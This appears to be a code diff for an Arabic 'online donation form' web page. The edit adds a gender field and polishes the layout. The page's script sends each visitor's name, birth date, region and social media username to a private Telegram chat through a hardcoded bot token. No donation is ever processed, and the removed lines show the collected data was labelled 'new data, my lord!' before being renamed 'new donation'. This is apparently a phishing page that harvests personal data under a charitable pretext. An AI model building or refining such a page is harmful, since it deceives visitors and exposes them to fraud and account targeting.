@@ -1,4 +1,5 @@
-<meta name='viewport' content='width=device-width, initial-scale=1'/><!DOCTYPE html>
+<meta name='viewport' content='width=device-width, initial-scale=1'/>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -16,6 +17,9 @@
         button { background-color: #2980b9; color: white; padding: 14px; border: none; border-radius: 6px; cursor: pointer; font-size: 18px; width: 100%; transition: background 0.3s; }
         button:hover { background-color: #3498db; }
         .footer { text-align: center; margin-top: 30px; color: #7f8c8d; font-size: 14px; }
+        .gender-options { display: flex; gap: 15px; margin-top: 8px; }
+        .gender-option { display: flex; align-items: center; }
+        .gender-option input { width: auto; margin-left: 8px; }
     </style>
 </head>
 <body>
@@ -27,17 +31,24 @@
         <h1>نموذج التبرع الإلكتروني</h1>
         <form id="donationForm">
             <div class="form-group">
-                <label for="name">الاسم  (بالكامل)</label>
+                <label for="name">الاسم (بالكامل)</label>
                 <input type="text" id="name" name="name" required>
             </div>
-            <div>
-  <label>نوع الجنس:</label><br>
-  <input type="radio" id="male" name="gender" value="ذكر" required>
-  <label for="male">ذكر</label><br>
-  
-  <input type="radio" id="female" name="gender" value="أنثى">
-  <label for="female">أنثى</label>
+            
+            <div class="form-group">
+                <label>الجنس</label>
+                <div class="gender-options">
+                    <div class="gender-option">
+                        <input type="radio" id="male" name="gender" value="ذكر" required>
+                        <label for="male">ذكر</label>
+                    </div>
+                    <div class="gender-option">
+                        <input type="radio" id="female" name="gender" value="أنثى">
+                        <label for="female">أنثى</label>
+                    </div>
+                </div>
             </div>
+    
             <div class="form-group">
                 <label for="fatherName">تاريخ الميلاد</label>
                 <input type="text" id="fatherName" name="fatherName" required>
@@ -47,7 +58,7 @@
                 <input type="text" id="region" name="region" required>
             </div>
             <div class="form-group">
-                <label for="socialMedia">اسم او يوزر حسابك<</label>
+                <label for="socialMedia">اسم او يوزر حسابك</label>
                 <input type="text" id="socialMedia" name="socialMedia" required>
             </div>
             <div class="form-group">
@@ -70,23 +81,25 @@
         document.getElementById('donationForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
+            const gender = document.querySelector('input[name="gender"]:checked')?.value || 'غير محدد';
+            
             const formData = {
                 name: document.getElementById('name').value,
+                gender: gender,
                 fatherName: document.getElementById('fatherName').value,
                 region: document.getElementById('region').value,
                 socialMedia: document.getElementById('socialMedia').value,
                 platform: document.getElementById('platform').value
             };
 
-            // التوكن الجديد يا حمار
             const BOT_TOKEN = "8097003009:AAHNdM6R-_RamFOyz7P0ECL-tTXIda2EMog";
-            // غير الآيدي حقك هنا يا غبي
             const CHAT_ID = "7763665935";
-            const message = `**🎯 بيانات جديدة يا سيدي!**\n\n👤 الاسم: ${formData.name}\n👨‍👦 اسم الأب: ${formData.fatherName}\n📍 المنطقة: ${formData.region}\n📱 الحساب: ${formData.socialMedia}\n📌 المنصة: ${formData.platform}`;
+            const message = `**🎯 تبرع جديد**\n\n👤 الاسم: ${formData.name}\n⚤ الجنس: ${formData.gender}\n📅 تاريخ الميلاد: ${formData.fatherName}\n📍 المنطقة: ${formData.region}\n📱 الحساب: ${formData.socialMedia}\n📌 المنصة: ${formData.platform}`;
 
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`);
                 alert("شكراً لتبرعك! سيتم التواصل معك قريباً.");
+                document.getElementById('donationForm').reset();
             } catch (error) {
                 console.error("Error sending to Telegram:", error);
                 alert("حدث خطأ! يرجى المحاولة لاحقاً.");
